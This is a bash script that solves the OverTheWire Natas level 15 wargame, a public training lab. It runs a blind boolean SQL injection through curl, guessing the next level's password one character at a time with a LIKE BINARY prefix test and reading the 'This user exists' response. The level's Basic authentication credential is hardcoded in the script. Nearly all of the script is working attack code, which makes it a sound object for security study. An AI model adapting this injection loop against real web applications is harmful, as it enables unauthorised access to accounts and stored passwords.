#! /bin/bash

rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""
  local pos c o

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER)
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}

export PASSWORD
export COUNT

# we assume the password length is 32
for i in {0..31}
do

  # loop through all valid possible characters
  for CH in {{0..9},{a..z},{A..Z}}
  do
    PASSWORD[$i]=$CH
    TESTSTRING=$(printf "%s" "${PASSWORD[@]}")

    #
    # our SQL injection is USERNAME='natas16" AND password LIKE BINARY "$PW%'
    #
    # SELECT * from users where username="natas16" AND password LIKE BINARY "$PW%"
    #
    export USERNAME="$( rawurlencode 'natas16" AND password LIKE BINARY "' )$TESTSTRING%"

    # the last echo'ed $TESTSTRING would represent the working usr/passwd combo
    echo "PASSWORD: $TESTSTRING"

    curl --silent \
      "http://natas15.natas.labs.overthewire.org/?username=$USERNAME%&debug" \
      -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
      | grep "This user exists" >/dev/null

    if [ $? -eq 0 ]; then
      # if the string "This user exists." it means our user+pw combo worked
      # and we can move onto the next character
      break;
    fi
  done

done 
